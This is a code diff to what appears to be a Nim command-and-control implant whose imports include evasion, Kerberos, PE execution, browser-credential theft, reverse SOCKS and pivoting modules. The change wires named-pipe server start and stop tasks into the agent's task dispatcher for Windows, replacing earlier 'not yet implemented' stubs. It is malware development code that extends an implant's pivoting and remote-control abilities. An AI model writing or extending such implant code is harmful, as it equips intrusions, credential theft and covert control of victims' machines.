@@ -5,7 +5,7 @@ import config, transport, evasion
 when defined(windows):
   import winim/lean, winim/inc/tlhelp32
   import kerberos, pe_exec, browsercreds, dotnet
-  import rsocks, http_pivot, tcp_pivot
+  import rsocks, http_pivot, tcp_pivot, pipe_server
   import bof
   import api_hash
 
@@ -2579,10 +2579,16 @@ proc dispatchTask*(t: var AgentTransport; id: int64; typ, args: string; payload:
       t.sendResult(id, "", "GEN_LNK: not supported on Linux")
 
   of "PIPE_START":
-    t.sendResult(id, "", "PIPE_START: not yet implemented in Nim agent")
+    when defined(windows):
+      t.sendResult(id, pipeServerStart(args, t.agentId), "")
+    else:
+      t.sendResult(id, "", "PIPE_START: not supported on Linux")
 
   of "PIPE_STOP":
-    t.sendResult(id, "", "PIPE_STOP: not yet implemented in Nim agent")
+    when defined(windows):
+      t.sendResult(id, pipeServerStop(args), "")
+    else:
+      t.sendResult(id, "", "PIPE_STOP: not supported on Linux")
 
   else:
     t.sendResult(id, "", "unknown task type: " & typ)
